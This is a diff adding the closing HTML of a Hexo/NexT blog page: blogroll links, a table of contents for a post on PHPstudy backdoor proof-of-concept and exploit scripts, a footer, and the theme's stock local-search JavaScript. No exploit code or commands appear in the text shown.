+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.asold.xyz" title="Aaron" target="_blank">Aaron</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://coco413.com/SecNavi/" title="SecNavi" target="_blank">SecNavi</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHPstudy后门漏洞POC-EXP编写"><span class="nav-number">1.</span> <span class="nav-text">PHPstudy后门漏洞POC-EXP编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码-and-效果"><span class="nav-number">2.</span> <span class="nav-text">代码 and 效果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#批量检测POC"><span class="nav-number">2.1.</span> <span class="nav-text">批量检测POC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#带参数检测、利用、传shell"><span class="nav-number">2.2.</span> <span class="nav-text">带参数检测、利用、传shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不带参数检测、利用、传shell"><span class="nav-number">2.3.</span> <span class="nav-text">不带参数检测、利用、传shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现及php传shell"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现及php传shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码编写总结"><span class="nav-number">4.</span> <span class="nav-text">代码编写总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关闭https警告"><span class="nav-number">4.1.</span> <span class="nav-text">关闭https警告</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用线程池"><span class="nav-number">4.2.</span> <span class="nav-text">使用线程池</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#requests请求后解析时自动判断编码问题"><span class="nav-number">4.3.</span> <span class="nav-text">requests请求后解析时自动判断编码问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#面向对象编程（类）高级用法"><span class="nav-number">4.4.</span> <span class="nav-text">面向对象编程（类）高级用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#argparse参数化解析编程"><span class="nav-number">4.5.</span> <span class="nav-text">argparse参数化解析编程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共61.5k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
